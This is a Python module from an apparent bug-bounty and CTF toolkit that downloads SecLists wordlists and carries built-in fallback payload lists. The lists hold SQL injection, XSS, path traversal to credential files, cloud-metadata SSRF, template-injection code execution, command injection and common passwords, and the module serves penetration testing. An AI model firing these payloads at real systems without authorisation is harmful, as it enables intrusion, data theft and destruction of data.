"""Payload wordlists — download real wordlists from SecLists and other sources.

Downloads curated payload lists from:
- SecLists (danielmiessler/SecLists) — SQLi, XSS, LFI, passwords
- Built-in fallback dictionaries for offline use

Wordlists are cached at ~/.hermes/wordlists/ after first download.

Usage:
    from bugbounty_ctf.wordlists import WordlistLoader

    loader = WordlistLoader()
    sqli = loader.load("sqli")  # downloads from SecLists, caches locally
    passwords = loader.load("passwords")
    custom = loader.load_file("/path/to/custom.txt")
"""

from __future__ import annotations

import os
from pathlib import Path
from typing import Any

import requests

WORDLIST_SOURCES: dict[str, dict[str, str | list[str]]] = {
    "sqli": {
        "url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/Databases/SQLi/Generic-SQLi.txt",
        "fallback": [
            "'",
            "' OR 1=1--",
            "' OR '1'='1",
            "admin'--",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1' AND SLEEP(3)--",
            "'; DROP TABLE users--",
            '" OR "1"="1',
            "' OR 1=1#",
        ],
    },
    "xss": {
        "url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/Polyglots/XSS-Polyglot-Ultimate-0xsobky.txt",
        "fallback": [
            "<script>alert(1)</script>",
            "<svg onload=alert(1)>",
            "<img src=x onerror=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "javascript:alert(1)",
            '"><script>alert(1)</script>',
        ],
    },
    "lfi": {
        "url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt",
        "fallback": [
            "../../../etc/passwd",
            "../../../../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "/etc/passwd",
            "/etc/shadow",
            "/proc/self/environ",
            "/root/.ssh/id_rsa",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
        ],
    },
    "passwords": {
        "url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt",
        "fallback": [
            "password",
            "admin",
            "root",
            "123456",
            "password123",
            "admin123",
            "letmein",
            "welcome",
            "monkey",
            "dragon",
            "master",
            "qwerty",
            "login",
            "abc123",
            "test",
            "guest",
        ],
    },
    "ssrf": {
        "url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/SSRF/SSRF-Canonical-StringVM-Fuzzing.txt",
        "fallback": [
            "http://127.0.0.1",
            "http://localhost",
            "http://0177.0.0.1",
            "http://2130706433",
            "http://0x7f000001",
            "http://127.1",
            "http://0",
            "http://0.0.0.0",
            "http://169.254.169.254/latest/meta-data/",
            "http://2852039166/latest/meta-data/",
            "file:///etc/passwd",
            "gopher://127.0.0.1:25/_HELO%20test",
            "dict://localhost:11211/stats",
        ],
    },
    "ssti": {
        "url": "",
        "fallback": [
            "{{7*7}}",
            "{{7*49}}",
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            "{7*7}",
            "{{config}}",
            "{{self}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        ],
    },
    "cmdi": {
        "url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/Command-Exec/Unix-Command-Inject-Scenarios.txt",
        "fallback": [
            "; id",
            "| id",
            "&& id",
            "|| id",
            "`id`",
            "$(id)",
            "; whoami",
            "| whoami",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; ls -la /",
            "| ls -la /",
        ],
    },
    "idor": {
        "url": "",
        "fallback": [
            "1",
            "2",
            "0",
            "3",
            "42",
            "100",
            "999",
            "1000",
            "admin",
            "root",
            "user",
        ],
    },
    "nosqli": {
        "url": "",
        "fallback": [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"$where": "1==1"}',
            '{"$ne": ""}',
            '{"$gt": null}',
        ],
    },
    "usernames": {
        "url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt",
        "fallback": [
            "admin",
            "root",
            "user",
            "test",
            "guest",
            "marcus",
            "devops",
            "developer",
            "operator",
            "service",
        ],
    },
    "useragents": {
        "url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/User-Agents/UserAgents.fuzz.txt",
        "fallback": [
            "Mozilla/5.0 (X11; Linux x86_64)",
            "curl/7.81.0",
            "python-requests/2.28.0",
            "Googlebot/2.1",
        ],
    },
    "dirbrute": {
        "url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/raft-small-words.txt",
        "fallback": [
            "admin",
            "login",
            "api",
            "config",
            "backup",
            "test",
            "debug",
            "old",
            "new",
            "secret",
            ".env",
            ".git",
            "flag",
            "flag.txt",
        ],
    },
}


class WordlistLoader:
    """Download and cache payload wordlists from remote sources.

    Downloads from SecLists on first use, caches at ~/.hermes/wordlists/.
    Falls back to built-in dictionaries if download fails.
    """

    def __init__(
        self,
        cache_dir: str | Path | None = None,
        *,
        timeout: int = 30,
    ) -> None:
        if cache_dir is None:
            pkg_dir = os.path.dirname(os.path.abspath(__file__))
            bundled = os.path.join(os.path.dirname(os.path.dirname(pkg_dir)), "wordlists")
            if os.path.isdir(bundled):
                cache_dir = bundled
            else:
                cache_dir = os.path.expanduser("~/.hermes/wordlists")
        self.cache_dir = str(cache_dir)
        self.timeout = timeout
        self._cache: dict[str, list[str]] = {}
        self._session = requests.Session()
        self._session.headers["User-Agent"] = "bugbounty-ctf/wordlist-loader"

    def _cache_path(self, vuln_type: str) -> str:
        return os.path.join(self.cache_dir, f"{vuln_type}.txt")

    def _download(self, url: str, cache_path: str) -> bool:
        try:
            r = self._session.get(url, timeout=self.timeout)
            if r.status_code == 200 and r.text.strip():
                os.makedirs(os.path.dirname(cache_path), exist_ok=True)
                with open(cache_path, "w") as f:
                    f.write(r.text)
                print(
                    f"  [+] Downloaded {len(r.text.splitlines())} entries from {url.split('/')[-1]}"
                )
                return True
        except Exception as e:
            print(f"  [-] Download failed: {e}")
        return False

    def load(self, vuln_type: str, *, force_download: bool = False) -> list[str]:
        if vuln_type in self._cache and not force_download:
            return self._cache[vuln_type]

        source = WORDLIST_SOURCES.get(vuln_type)
        if not source:
            print(f"  [-] Unknown wordlist type: {vuln_type}")
            return []

        cache_path = self._cache_path(vuln_type)

        if not force_download and os.path.exists(cache_path):
            payloads = self.load_file(cache_path)
            if payloads:
                self._cache[vuln_type] = payloads
                return payloads

        url: str = source.get("url", "")  # type: ignore[assignment]
        if url and self._download(url, cache_path):
            payloads = self.load_file(cache_path)
            if payloads:
                self._cache[vuln_type] = payloads
                return payloads

        fallback: list[str] = source.get("fallback", [])  # type: ignore[assignment]
        self._cache[vuln_type] = fallback
        print(f"  [*] Using built-in {vuln_type} wordlist ({len(fallback)} entries)")
        return fallback

    @staticmethod
    def load_file(path: str) -> list[str]:
        try:
            with open(path) as f:
                return [line.strip() for line in f if line.strip() and not line.startswith("#")]
        except OSError:
            return []

    def load_from_markdown(self, md_path: str, section: str | None = None) -> list[str]:
        try:
            with open(md_path) as f:
                content = f.read()
        except OSError:
            return []

        payloads: list[str] = []
        in_section = section is None
        in_code = False
        code_lines: list[str] = []

        for line in content.split("\n"):
            if section and line.strip().startswith("#"):
                if section.lower() in line.lower():
                    in_section = True
                elif in_section:
                    in_section = False

            if in_section:
                if line.strip().startswith("```"):
                    if in_code:
                        if code_lines:
                            payload = "\n".join(code_lines).strip()
                            if payload:
                                payloads.append(payload)
                        code_lines = []
                        in_code = False
                    else:
                        in_code = True
                elif in_code:
                    code_lines.append(line)
                elif line.strip().startswith("- ") or line.strip().startswith("* "):
                    payload = line.strip()[2:].strip()
                    if payload and not payload.startswith("#"):
                        payloads.append(payload)

        return payloads

    def get_payload_dict(self, vuln_type: str) -> dict[str, str]:
        payloads = self.load(vuln_type)
        return {f"{vuln_type}_{i}": p for i, p in enumerate(payloads)}

    def list_types(self) -> list[str]:
        return list(WORDLIST_SOURCES.keys())

    def download_all(self) -> dict[str, int]:
        results: dict[str, int] = {}
        print(f"[*] Downloading all wordlists to {self.cache_dir}")
        for vuln_type in WORDLIST_SOURCES:
            payloads = self.load(vuln_type, force_download=True)
            results[vuln_type] = len(payloads)
            print(f"  {vuln_type}: {len(payloads)} entries")
        return results

    def merge(self, vuln_type: str, extra: list[str]) -> list[str]:
        base = self.load(vuln_type)
        merged = base + [p for p in extra if p not in base]
        self._cache[vuln_type] = merged
        return merged

    def cache_info(self) -> dict[str, dict[str, Any]]:
        info: dict[str, dict[str, Any]] = {}
        for vuln_type in WORDLIST_SOURCES:
            cache_path = self._cache_path(vuln_type)
            info[vuln_type] = {
                "cached": os.path.exists(cache_path),
                "path": cache_path,
                "source": WORDLIST_SOURCES[vuln_type].get("url", "built-in only"),
            }
        return info
